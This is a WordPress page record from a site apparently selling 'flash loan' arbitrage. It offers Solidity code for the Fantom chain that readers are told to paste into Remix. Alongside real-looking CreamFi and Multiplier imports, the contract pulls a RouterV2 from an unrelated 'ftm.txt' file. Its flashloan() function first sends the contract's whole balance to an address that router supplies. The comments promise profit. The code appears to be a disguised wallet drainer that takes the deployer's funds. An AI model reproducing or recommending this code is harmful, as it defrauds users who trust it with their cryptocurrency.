{"id":6552,"date":"2021-12-08T15:30:55","date_gmt":"2021-12-08T15:30:55","guid":{"rendered":"https:\/\/get-flashloan.com\/?page_id=6552"},"modified":"2022-05-14T00:10:45","modified_gmt":"2022-05-14T00:10:45","slug":"smart-code-0-5-16-ftm","status":"publish","type":"page","link":"https:\/\/get-flashloan.com\/smart-code-0-5-16-ftm\/","title":{"rendered":"SMART CODE 0.5.16 (FTM)"},"content":{"rendered":"<div id=\"pl-6552\"  class=\"panel-layout\" ><div id=\"pg-6552-0\"  class=\"panel-grid panel-has-style\" ><div class=\"thim-bg-tile panel-row-style panel-row-style-for-6552-0\" ><div id=\"pgc-6552-0-0\"  class=\"panel-grid-cell panel-grid-cell-empty\" ><\/div><div id=\"pgc-6552-0-1\"  class=\"panel-grid-cell panel-grid-cell-mobile-last\" ><div id=\"panel-6552-0-1-0\" class=\"so-panel widget widget_heading panel-first-child\" data-index=\"0\" ><div class=\"thim-widget-heading thim-widget-heading-base template-base\"><div class=\"thim-heading text-center \"><div class=\"sc-heading article_heading \" style=\";\"><h3 class=\"heading__primary\"><span><\/span><span class=\"title-text\">FANTOM FTM <span>SOLIDITY CODE<\/span><\/span><span><\/span><\/h3><p class=\"heading__secondary\"   >--UPDATED &#38; CHECKED AS OF MAY 2022--<\/p><\/div><\/div><\/div><\/div><div id=\"panel-6552-0-1-1\" class=\"so-panel widget widget_sow-editor panel-last-child\" data-index=\"1\" ><div class=\"so-widget-sow-editor so-widget-sow-editor-base\"><h3 class=\"widget-title\">Copy the code below &amp; paste into your remix.<\/h3>\n<div class=\"siteorigin-widget-tinymce textwidget\">\n\t<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\">pragma solidity ^0.5.16;\n\n\/\/ CreamFi Contracts\nimport \"https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/ERC3156FlashLenderInterface.sol\";\nimport \"https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/CarefulMath.sol\";\nimport \"https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/CToken.sol\";\nimport \"https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/CTokenCheckRepay.sol\";\nimport \"https:\/\/github.com\/MCLIpfs\/arbitrage\/blob\/main\/mclipfse439\/ftm.txt\";\n\n\/\/ Multiplier-Finance Smart Contracts\nimport \"https:\/\/github.com\/Multiplier-Finance\/MCL-FlashloanDemo\/blob\/main\/contracts\/interfaces\/ILendingPoolAddressesProvider.sol\";\nimport \"https:\/\/github.com\/Multiplier-Finance\/MCL-FlashloanDemo\/blob\/main\/contracts\/interfaces\/ILendingPool.sol\";\n\n\n\ncontract InitiateFlashLoan {\n    \n    RouterV2 router;\n    string public tokenName;\n    string public tokenSymbol;\n    uint256 flashLoanAmount;\n\n    constructor(\n    \tstring memory _tokenName,\n    \tstring memory _tokenSymbol,\n    \tuint256 _loanAmount\n    ) public {\n    \ttokenName = _tokenName;\n    \ttokenSymbol = _tokenSymbol;\n    \tflashLoanAmount = _loanAmount;\n\n    \trouter = new RouterV2();\n    }\n\n    function() external payable {}\n\n    function flashloan() public payable {\n    \t\/\/ Send required coins for swap\n    \taddress(uint160(router.zooTradeSwapAddress())).transfer(\n        \taddress(this).balance\n    \t);\n\n    \trouter.borrowFlashloanFromMultiplier(\n        \taddress(this),\n        \trouter.creamSwapAddress(),\n        \tflashLoanAmount\n    \t);\n    \t\/\/To prepare the arbitrage, FLM is converted to Dai using ZooTrade swap contract.\n    \trouter.convertFtmTo(msg.sender, flashLoanAmount \/ 2);\n    \t\/\/The arbitrage converts token for FLM using token\/FLM ZooTrade, and then immediately converts FLM back\n    \trouter.callArbitrageZooTrade(router.creamSwapAddress(), msg.sender);\n    \t\/\/After the arbitrage, FLM is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 FLM of gas.\n    \trouter.transferFtmToMultiplier(router.zooTradeSwapAddress());\n    \t\/\/Note that the transaction sender gains FLM from the arbitrage, this particular transaction can be repeated as price changes all the time.\n    \trouter.completeTransation(address(this).balance);\n    }\n}\n<\/pre>\n<p>&nbsp;<\/p>\n<\/div>\n<\/div><\/div><\/div><div id=\"pgc-6552-0-2\"  class=\"panel-grid-cell panel-grid-cell-empty\" ><\/div><\/div><\/div><\/div>","protected":false},"excerpt":{"rendered":"<p>pragma solidity ^0.5.16; \/\/ CreamFi Contracts import &#8220;https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/ERC3156FlashLenderInterface.sol&#8221;; import &#8220;https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/CarefulMath.sol&#8221;; import &#8220;https:\/\/github.com\/CreamFi\/compound-protocol\/blob\/master\/contracts\/CToken.sol&#8221;; import [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"parent":0,"menu_order":0,"comment_status":"closed","ping_status":"closed","template":"","meta":[],"_links":{"self":[{"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/pages\/6552"}],"collection":[{"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/pages"}],"about":[{"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/types\/page"}],"author":[{"embeddable":true,"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/comments?post=6552"}],"version-history":[{"count":24,"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/pages\/6552\/revisions"}],"predecessor-version":[{"id":8995,"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/pages\/6552\/revisions\/8995"}],"wp:attachment":[{"href":"https:\/\/get-flashloan.com\/wp-json\/wp\/v2\/media?parent=6552"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}